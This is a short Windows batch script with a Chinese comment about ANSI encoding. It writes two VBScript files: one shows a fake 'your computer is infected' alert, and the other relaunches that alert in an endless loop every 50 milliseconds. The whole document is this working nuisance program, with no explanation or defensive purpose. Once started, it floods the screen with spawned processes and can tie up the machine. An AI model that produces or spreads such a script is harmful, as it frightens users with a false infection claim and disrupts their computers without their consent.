:: 已預設為ANSI編碼
@echo off
echo MsgBox "你的電腦中毒了",16 >中毒1.vbs
echo do >中毒2.vbs
echo CreateObject("WScript.Shell").Run("%cd%\中毒1.vbs") >>中毒2.vbs
echo WScript.Sleep 50 >>中毒2.vbs
echo loop >>中毒2.vbs
start %cd%\中毒2.vbs